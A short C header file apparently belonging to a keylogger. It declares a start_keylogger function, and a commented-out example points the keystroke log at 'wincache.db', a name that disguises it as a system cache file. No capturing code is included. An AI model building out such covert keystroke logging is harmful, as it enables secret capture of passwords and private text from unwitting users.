#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#ifdef __cplusplus
extern "C" {
#endif

void start_keylogger(const char *log_file_path);

#ifdef __cplusplus
}
#endif

#endif 
/*
#include "keylogger.h"

int main() {
    const char *log_path = "wincache.db";
    start_keylogger(log_path);
    return 0;
}

*/
